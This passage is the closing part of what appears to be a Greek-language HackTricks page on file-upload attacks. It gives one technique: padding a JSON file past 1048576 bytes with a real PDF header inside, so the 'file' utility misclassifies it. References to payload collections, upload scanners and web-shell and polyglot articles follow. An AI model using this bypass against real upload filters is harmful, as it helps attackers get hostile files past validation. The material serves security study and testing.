- **`file` binary**: Μπορεί να διαβάσει μέχρι 1048576 bytes από ένα αρχείο. Δημιουργήστε ένα JSON μεγαλύτερο από αυτό ώστε να μην μπορεί να αναλύσει το περιεχόμενο ως json και μετά μέσα στο JSON τοποθετήστε το αρχικό μέρος ενός πραγματικού PDF και θα το θεωρήσει PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
